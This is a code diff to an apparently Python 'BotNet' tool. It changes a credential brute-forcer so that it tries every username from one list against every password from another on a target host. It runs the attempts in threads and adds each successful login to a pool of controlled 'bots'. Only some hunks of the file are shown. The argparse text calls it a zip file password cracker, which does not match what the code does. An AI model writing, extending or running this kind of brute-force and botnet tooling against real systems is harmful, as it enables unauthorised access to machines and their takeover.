@@ -4,17 +4,18 @@ from typing import Optional
 from termcolor import colored
 from src.entities.Bot import Bot
 from src.constants.logo import ascii_logo
+from src.utils.read_txt_files import read_text_file
 
 
 class BotNet:
-    def __init__(self, host: str = '', user: str = '', pwd_src_path: str = ''):
+    def __init__(self, host: str = '', usr_src_path: str = '', pwd_src_path: str = ''):
         self.__bots: list[Bot] = []
 
         self.host = host
-        self.user = user
+        self.usr_src_path = usr_src_path
         self.pwd_src_path = pwd_src_path
 
-        if not self.host or not self.user or not self.pwd_src_path:
+        if not self.host or not self.usr_src_path or not self.pwd_src_path:
             self.__get_args()
 
         print(colored(ascii_logo, 'cyan'))
@@ -23,32 +24,37 @@ class BotNet:
     def __get_args(self):
         parser = argparse.ArgumentParser(description='Zip file password cracker')
         parser.add_argument('-H', dest='host', type=str, help='Target host', required=True)
-        parser.add_argument('-u', dest='user', type=str, help='Target user', required=True)
-        parser.add_argument('-F', dest='pwd_src_path', type=str, help='Passwords source path', required=True)
+        parser.add_argument('-u', dest='usr_src_path', type=str, help='Users source path', required=True)
+        parser.add_argument('-p', dest='pwd_src_path', type=str, help='Passwords source path', required=True)
         args = parser.parse_args()
 
         self.host = args.host
-        self.user = args.user
+        self.usr_src_path = args.usr_src_path
         self.pwd_src_path = args.pwd_src_path
 
 
     def __get_passwords(self):
-        with open(self.pwd_src_path) as passwords_file:
-            for password in passwords_file:
-                password = password.strip()
-                yield password
+        for password in read_text_file(self.pwd_src_path):
+            yield password
 
 
-    def __set_bots(self, password: str):
-        bot = Bot(self.host, self.user, password)
+    def __get_users(self):
+        for password in read_text_file(self.usr_src_path):
+            yield password
 
-        try:
-            is_connected = bot.connect()
-            if is_connected:
-                print(colored(f'Connected to [{bot.id}][{bot.name}]', 'green'))
-                self.__bots.append(bot)
-        except:
-            pass
+
+    def __set_bots(self, user: str):
+
+        for password in self.__get_passwords():
+            bot = Bot(self.host, user, password)
+
+            try:
+                is_connected = bot.connect()
+                if is_connected:
+                    print(colored(f'Connected to [{bot.id}][{bot.name}]', 'green'))
+                    self.__bots.append(bot)
+            except:
+                pass
 
 
     def disconnect_all(self):
@@ -131,7 +137,7 @@ class BotNet:
         print(colored('Connecting to bots...', 'yellow'))
         try:
             threads = []
-            for password in self.__get_passwords():
+            for password in self.__get_users():
                 thread = Thread(target=self.__set_bots, args=(password,))
                 thread.start()
                 threads.append(thread)
